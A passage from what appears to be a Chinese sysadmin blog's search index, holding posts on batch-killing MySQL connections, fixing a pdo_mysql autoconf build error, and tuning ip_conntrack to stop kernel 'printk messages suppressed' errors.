<p>方法二:<br>杀掉当前所有的MySQL连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysqladmin -uroot -p processlist|awk -F &quot;|&quot; &apos;&#123;print $2&#125;&apos;|xargs -n 1 mysqladmin -uroot -p kill</div><div class="line">杀掉指定用户运行的连接，这里为Mike</div><div class="line">mysqladmin -uroot -p processlist|awk -F &quot;|&quot; &apos;&#123;if($3 == &quot;Mike&quot;)print $2&#125;&apos;|xargs -n 1 mysqladmin -uroot -p kill</div></pre></td></tr></table></figure></p>
<p>方法三:<br>通过SHEL脚本实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#杀掉锁定的MySQL连接</div><div class="line">for id in `mysqladmin processlist|grep -i locked|awk &apos;&#123;print $1&#125;&apos;`</div><div class="line">do</div><div class="line">   mysqladmin kill $&#123;id&#125;</div><div class="line">done</div></pre></td></tr></table></figure></p>
<p>方法四:<br>通过Maatkit工具集中提供的mk-kill命令进行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#杀掉超过60秒的sql</div><div class="line">mk-kill -busy-time 60 -kill</div><div class="line">#如果你想先不杀，先看看有哪些sql运行超过60秒</div><div class="line">mk-kill -busy-time 60 -print</div><div class="line">#如果你想杀掉，同时输出杀掉了哪些进程</div><div class="line">mk-kill -busy-time 60 -print –kill</div></pre></td></tr></table></figure></p>
<p>mk-kill更多用法可参考：</p>
<blockquote>
<p><a href="http://www.maatkit.org/doc/mk-kill.html" target="_blank" rel="external">http://www.maatkit.org/doc/mk-kill.html</a><br><a href="http://www.sbear.cn/archives/426" target="_blank" rel="external">http://www.sbear.cn/archives/426</a></p>
</blockquote>
<p>Maatkit工具集的其它用法可参考：</p>
<blockquote>
<p><a href="http://code.google.com/p/maatkit/wiki/TableOfContents?tm=6" target="_blank" rel="external">http://code.google.com/p/maatkit/wiki/TableOfContents?tm=6</a></p>
</blockquote>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p>　<a href="http://www.orczhou.com/index.php/2010/10/kill-mysql-connectio-in-batch/" target="_blank" rel="external">http://www.orczhou.com/index.php/2010/10/kill-mysql-connectio-in-batch/</a><br>　<a href="http://www.mysqlperformanceblog.com/2009/05/21/mass-killing-of-mysql-connections/" target="_blank" rel="external">http://www.mysqlperformanceblog.com/2009/05/21/mass-killing-of-mysql-connections/</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[在php扩展pdo_mysql时，报autoconf错误解决]]></title>
      <url>/2012/03/12/pdo-mysql-autoconf-error.html</url>
      <content type="html"><![CDATA[<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>···<br>[root@monitor pdo_mysql]# phpize<br>Configuring for:<br>PHP Api Version: 20090626<br>Zend Module Api No: 20090626<br>Zend Extension Api No: 220090626<br>config.m4:138: warning: AC_CACHE_VAL(pdo_inc_path, …): suspicious cache-id, must contain <em>cv</em> to be cached<br>../../lib/autoconf/general.m4:1974: AC_CACHE_VAL is expanded from…<br>../../lib/autoconf/general.m4:1994: AC_CACHE_CHECK is expanded from…<br>aclocal.m4:2748: PHP_CHECK_PDO_INCLUDES is expanded from…<br>config.m4:138: the top level<br>config.m4:138: warning: AC_CACHE_VAL(pdo_inc_path, …): suspicious cache-id, must contain <em>cv</em> to be cached<br>../../lib/autoconf/general.m4:1974: AC_CACHE_VAL is expanded from…<br>../../lib/autoconf/general.m4:1994: AC_CACHE_CHECK is expanded from…<br>aclocal.m4:2748: PHP_CHECK_PDO_INCLUDES is expanded from…<br>config.m4:138: the top level<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#### 解决方法</div></pre></td></tr></table></figure></p>
<p>autoconf版本太高造成的,我的办法是安装autoconf 2.13<br>redhat类系统运行如下命令<br>yum install autoconf213.noarch<br>export PHP_AUTOCONF=/usr/bin/autoconf-2.13<br>export PHP_AUTOHEADER=/usr/bin/autoheader-2.13</p>
<p>64位环境下<br>configure: error: libjpeg.(a|so) not found.<br>或者 configure: error: *.(a|so) not found.<br>这些库已经安装了但还报错<br>在configure 时加参数 –with-libdir=lib64<br>```</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pdo_mysql扩展 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[解决系统日志： kernel: printk: xxxx messages suppressed.问题]]></title>
      <url>/2012/02/27/kernel-printk-suppressed.html</url>
      <content type="html"><![CDATA[<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>LAMP架构服务，早上网站打不开，ssh登录连接不上服务器，能ping通，域名能解析</p>
<p><strong>日志截图：</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/old/2012/02/1.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/old/2012/02/1-300x225.jpg" alt="" title="1"></a></p>
<h4 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h4><p>此问题出在TCP连接造成，由于安全考虑系统启用了iptables防火墙，有conntrack模块，此模块用于跟踪并且记录连接状态，连接跟踪是防火墙模块的状态检测的基础，一个跟踪连接表会占用350字节的内核存储空间，系统运行时间长时就会把默认的空间填满（IP_conntrack），需要定期清理。</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">1.加大 ip_conntrack_max 值</div><div class="line">vi /etc/sysctl.conf</div><div class="line">net.ipv4.ip_conntrack_max = 655360</div><div class="line"></div><div class="line">2.降低 ip_conntrack timeout 时间</div><div class="line">vi /etc/sysctl.conf</div><div class="line">net.ipv4.netfilter.ip_conntrack_tcp_timeout_established = 180</div><div class="line">#sysctl -p 生效</div><div class="line"></div><div class="line">查看目前 ip_conntrack buffer 使用状况</div><div class="line">grep conn /proc/slabinfo</div><div class="line"></div><div class="line">查出目前 ip_conntrack 记录最多的前五名 IP</div><div class="line">cat /proc/net/ip_conntrack | cut -d &apos; &apos; -f 10 | cut -d &apos;=&apos; -f 2 | sort | uniq -c | sort -nr | head -n 5</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
  
  
</search>
